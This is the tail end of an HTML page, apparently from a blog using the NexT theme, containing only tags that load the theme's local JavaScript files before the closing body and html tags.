  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  








  





  

  

  

  

  

  

</body>
</html>
